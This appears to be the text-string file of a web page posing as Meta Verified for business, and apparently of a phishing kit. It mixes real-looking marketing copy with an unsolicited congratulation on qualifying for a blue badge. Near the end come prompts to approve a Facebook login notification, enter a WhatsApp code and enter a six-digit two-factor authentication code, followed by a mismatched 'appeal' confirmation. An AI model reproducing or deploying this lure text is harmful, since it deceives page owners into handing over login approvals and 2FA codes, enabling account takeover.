hero.title: Show the world that you mean business.
hero.description: Meta Verified helps you build more confidence with new audiences and protects your brand.
hero.note: Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.

benefits.title: Explore Meta Verified for business benefits.
benefits.description: Meta Verified provides tools to help you build more confidence with new audiences, protect your brand and more efficiently engage with your customers.

verifiedBadge.title: Verified badge
verifiedBadge.description: The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.

protection.title: Impersonation protection
protection.description: Protect your brand with proactive impersonation monitoring. Meta will remove accounts we determine are pretending to be you.

support.title: Enhanced support
support.description: Get 24/7 access to email or chat agent support for account issues.

features.title: Upgraded profile features
features.description: Enrich your profile by adding images to your links to help boost engagement.

steps.title: Sign up for Meta Verified.
steps.description: Our verification process is designed to maintain the integrity of the verified badge for businesses.

step1.title: Start your application.
step1.description: Those interested in applying for Meta Verified will need to register and meet certain eligibility requirements (requirements for Facebook and Instagram). When getting started, you should have your business contact information ready.

step2.title: Verify business details.
step2.description: You may be asked to share details such as your business name, address, website and/or phone number.

step3.title: Get reviewed.
step3.description: We'll review your application and send an update on your status within three business days.

testimonials.title: See how Meta Verified has helped real businesses.

items.quote: After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience. I think seeing a verified badge builds trust. People that I don't know or newer brands interested in working with me can be sure that they're talking with me and not a scammer.
items.author: Kimber Greenwood, Owner of Water Bear

items.quote: Since subscribing, I've noticed a real difference. My posts are getting more reach, engagement has gone up, and I'm seeing more interactions on stories and reels.
items.author: Devon Kirby, Owner

items.quote: Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business that takes both our products and social presence seriously.
items.author: Sarah Clancy, Owner of Sarah Marie

faq.title: Frequently asked questions
faq.subtitle: For more, visit our Help Centre.

q1.question: How do I know if my business is eligible?
q1.answer: Meta Verified is available for businesses that meet certain eligibility requirements in selected regions. You will need to register and meet certain eligibility requirements to sign up.

q2.question: How do I update my information if I'm not eligible?
q2.answer: Join our waitlist to stay updated. We'll notify you when Meta Verified for Business becomes available for you. Joining the waitlist does not guarantee early access to Meta Verified.

q3.question: What if I already have a verified badge?
q3.answer: No action is needed to keep your badge. Existing verified badge holders can apply for a Meta Verified subscription to access additional benefits if they meet the eligibility requirements.

q4.question: What if I'm interested in Meta Verified for creators?
q4.answer: You can learn more and sign up on the Meta Verified for creators website.

q5.question: Where will my badge appear?
q5.answer: If you choose a Facebook asset to include in your subscription, your Facebook Page and Messenger account will display the verified badge. If you choose an Instagram asset, your Instagram and Threads accounts will display the verified badge.

q6.question: What determines which plans I can purchase?
q6.answer: The plans available to you depend on your region, business type, and other eligibility criteria. Features, availability, and pricing may vary by region.

q7.question: Do my Meta Verified benefits extend to other accounts?
q7.answer: Meta Verified benefits apply to the specific accounts included in your subscription. Additional accounts may require separate subscriptions.

connection.title: Every connection is an opportunity. It's Your World.

footer.newsletterTitle: Get the latest updates from Meta for Business.
footer.newsletterDesc: Provide your email address to receive the latest updates from Meta for Business, including news, events and product updates.
footer.policy: By submitting this form, you agree to receive marketing-related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe at any time. Your data will be processed in accordance with Meta's Data Policy.

methodModal.desc: These are your available confirmation methods.

notification.desc: We've sent a notification to your device. Check your Facebook notification on your device and approve access to continue.

whatapp.desc: Check your WhatsApp messages. Enter the code we sent to your WhatsApp account.

recovery.title: Access your authentication app.
recovery.desc: Enter the 6-digit verification code you received from your selected two-factor authentication app (such as Duo Mobile or Google Authenticator) for this account.

step4.title: Request has been sent
step4.desc: Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.
